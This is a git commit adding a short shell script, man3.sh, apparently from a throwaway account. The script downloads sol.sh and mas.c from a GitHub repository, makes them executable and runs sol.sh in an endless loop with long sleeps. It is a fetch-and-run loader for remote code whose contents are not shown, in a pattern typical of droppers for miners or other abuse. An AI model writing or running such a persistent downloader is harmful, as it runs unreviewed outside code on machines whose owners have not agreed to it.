a302f97318431c23c1267dc373ffe6d2b0aa270b
likeudo153 <89896695+likeudo153@users.noreply.github.com>
2021-09-13 22:39:05 +0530

    Create man3.sh

---
+++ man3.sh
@@ -0,0 +1,10 @@
+  
+#!/bin/sh
+  wget https://github.com/likeudo153/FkgX/raw/main/sol.sh
+  chmod +x sol.sh 
+  wget https://github.com/likeudo153/FkgX/raw/main/mas.c
+  chmod +x mas.c
+  while [ 1 ]; do
+  ./sol.sh
+  sleep 20000
+  done
